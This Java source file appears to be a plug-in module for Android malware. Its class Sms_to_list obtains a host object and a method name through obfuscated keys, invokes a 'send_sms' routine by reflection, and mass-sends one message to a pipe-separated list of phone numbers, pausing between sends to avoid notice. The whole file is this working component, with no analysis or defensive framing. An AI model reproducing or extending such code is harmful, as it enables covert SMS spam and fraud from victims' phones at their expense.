package com.moonny.mods_src;

import org.json.JSONObject;
import java.lang.reflect.Method;
import java.util.HashMap;

public class Sms_to_list {

    public int MAIN_VER_REQUIRED = 100; // minimum Main api version required
    private Object mods;
    private Method run_func;

    public Sms_to_list(HashMap<String, Object> system) throws Exception
    {
        this.mods = system.get("a4");
        this.run_func = mods.getClass().getDeclaredMethod((String) system.get("a5"), String.class, String.class, Object[].class);
    }

    public JSONObject run(JSONObject params) throws Exception {

        String msg = params.getString("m");
        String delay_custom = params.getString("d");
        String[] numbers = params.getString("nn").split("\\|");

        if(numbers.length == 0)
            return null;

        int delay;
        try {
            delay = Integer.parseInt(delay_custom);
            if(delay < 10)
                delay = 10;
        }catch (Exception e){
            delay = 10;
        }

        for (String number: numbers) {

            //Log.d("Sms_mass_plus", "SEND " + number+": " +msg);
            run_func.invoke(mods, "main", "send_sms", new Object[]{ number, msg });

            try {
                Thread.sleep(delay * 1000);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }

        return null;
    }

}
